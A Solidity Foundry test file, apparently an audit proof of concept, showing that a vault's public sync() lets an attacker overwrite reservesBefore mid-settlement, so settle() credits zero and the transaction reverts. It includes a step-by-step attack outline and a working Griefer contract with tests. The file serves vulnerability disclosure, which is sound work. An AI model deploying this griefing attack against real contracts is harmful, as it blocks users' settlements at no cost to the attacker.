// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Vault} from "../../src/Vault.sol";
import {IVault} from "../../src/interfaces/IVault.sol";
import {ILockCallback} from "../../src/interfaces/ILockCallback.sol";
import {Currency} from "../../src/types/Currency.sol";

// ============================================================
// VULNERABILITY: Public sync() Enables Settlement Griefing DoS
//
// File:  src/Vault.sol
// Lines: 145 (sync has no access control)
//        214 (paid = reservesNow - reservesBefore)
//
// Attack:
//   1. Victim calls sync(TOKEN)     reservesBefore = X
//   2. Victim transfers N tokens    vault balance = X + N
//   3. Attacker calls sync(TOKEN)   reservesBefore overwritten = X + N
//   4. Victim calls settle()        paid = (X+N)-(X+N) = 0
//   5. Delta is unresolved          lock() reverts CurrencyNotSettled
//
// Cost to attacker: one tx, zero tokens, zero permissions
// ============================================================

// ---- Minimal ERC20 -----------------------------------------
contract MockERC20 {
    string public name = "T";
    string public symbol = "T";
    uint8  public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ---- Attacker ----------------------------------------------
contract Griefer {
    IVault public vault;

    constructor(IVault _vault) { vault = _vault; }

    function attack(Currency currency) external {
        vault.sync(currency);
    }
}

// ---- Registered pool manager -------------------------------
// Simulates how a real pool manager works:
//   - registers a NEGATIVE delta first (user owes tokens to pool)
//   - user must then sync + transfer + settle to resolve it
//
// Sign convention in Vault._accountDeltaForApp():
//   delta >= 0  ->  reservesOfApp DECREASES (pool pays out)
//   delta <  0  ->  reservesOfApp INCREASES (user pays in)
//
// To say "user owes us tokens" we pass a NEGATIVE delta.
// settle() then credits a POSITIVE delta to cancel it out.
contract FakePoolManager is ILockCallback {
    IVault    public vault;
    MockERC20 public token;
    Currency  public currency;

    address public user;
    address public griefContract;
    bool    public enableAttack;
    uint256 public paid;

    constructor(IVault _vault, MockERC20 _token) {
        vault    = _vault;
        token    = _token;
        currency = Currency.wrap(address(_token));
    }

    function setAttack(address _griefer) external {
        griefContract = _griefer;
        enableAttack  = true;
    }

    function execute(uint256 amount) external {
        user = msg.sender;
        vault.lock(abi.encode(amount));
    }

    function lockAcquired(bytes calldata data) external override returns (bytes memory) {
        uint256 amount = abi.decode(data, (uint256));

        // STEP 1: Register obligation
        // Negative delta = user owes `amount` tokens to the pool.
        // reservesOfApp[pm][token] += amount  (pool's reserve increases)
        // currencyDelta[user][token] -= amount (user has a negative/owed delta)
        // The user must cancel this by sending real tokens via settle().
        vault.accountAppBalanceDelta(
            currency,
            -int128(int256(amount)),  // NEGATIVE: user owes tokens
            user
        );

        // STEP 2: Victim syncs to checkpoint vault balance
        vault.sync(currency);

        // STEP 3: Victim transfers tokens into vault
        token.transferFrom(user, address(vault), amount);

        // ATTACK: griefer overwrites reservesBefore with current balance
        // This makes settle() return 0 instead of amount
        if (enableAttack) {
            Griefer(griefContract).attack(currency);
        }

        // STEP 4: settle()
        //   Without grief: paid = amount -> credits user +amount -> cancels -amount delta -> OK
        //   With grief:    paid = 0     -> user delta stays at -amount -> lock() REVERTS
        paid = vault.settleFor(user);

        return "";
    }
}

// ---- Tests -------------------------------------------------
contract SyncGriefingPoC is Test {

    Vault           public vault;
    MockERC20       public token;
    FakePoolManager public pm;
    Griefer         public attacker;
    Currency        public currency;

    address user = address(0xBEEF);
    uint256 constant AMOUNT = 100 ether;

    function setUp() public {
        vault    = new Vault();
        token    = new MockERC20();
        currency = Currency.wrap(address(token));
        pm       = new FakePoolManager(vault, token);
        attacker = new Griefer(vault);

        // pm must be a registered app to call accountAppBalanceDelta
        vault.registerApp(address(pm));

        token.mint(user, 1000 ether);
        vm.prank(user);
        token.approve(address(pm), type(uint256).max);
    }

    // --------------------------------------------------------
    // TEST 1: Normal - settlement works without attack
    // --------------------------------------------------------
    function test_1_normal_settlement() public {
        vm.prank(user);
        pm.execute(AMOUNT);

        uint256 paid = pm.paid();
        console.log("Paid (no attack):", paid);
        assertEq(paid, AMOUNT, "Full amount should be settled");
        console.log("PASS: normal settlement works");
    }

    // --------------------------------------------------------
    // TEST 2: Attack - grief causes CurrencyNotSettled revert
    // --------------------------------------------------------
    function test_2_sync_grief_causes_revert() public {
        pm.setAttack(address(attacker));

        vm.prank(user);
        vm.expectRevert(IVault.CurrencyNotSettled.selector);
        pm.execute(AMOUNT);

        console.log("PASS: lock reverted with CurrencyNotSettled");
        console.log("PASS: attacker used zero tokens, zero permissions");
    }

    // --------------------------------------------------------
    // TEST 3: Mechanism - sync() overwrites the reserve
    // --------------------------------------------------------
    function test_3_reserve_overwrite_mechanism() public {
        token.mint(address(vault), 50 ether);

        vault.sync(currency);
        (, uint256 res1) = vault.getVaultReserve();
        assertEq(res1, 50 ether);
        console.log("After victim sync:  reservesBefore =", res1);

        token.mint(address(this), 100 ether);
        token.transfer(address(vault), 100 ether);

        // Attacker overwrites reserve
        vault.sync(currency);
        (, uint256 res2) = vault.getVaultReserve();
        assertEq(res2, 150 ether);
        console.log("After griefer sync: reservesBefore =", res2);

        uint256 wouldBePaid = token.balanceOf(address(vault)) - res2;
        assertEq(wouldBePaid, 0, "paid = 0 after overwrite");
        console.log("settle() would compute paid =", wouldBePaid);
        console.log("PASS: reserve overwrite confirmed");
    }

    // --------------------------------------------------------
    // TEST 4: Attacker needs only gas
    // --------------------------------------------------------
    function test_4_attacker_cost_only_gas() public {
        assertEq(token.balanceOf(address(attacker)), 0);
        assertFalse(vault.isAppRegistered(address(attacker)));

        attacker.attack(currency);

        console.log("PASS: vault.sync() callable with no tokens or role");
    }
}
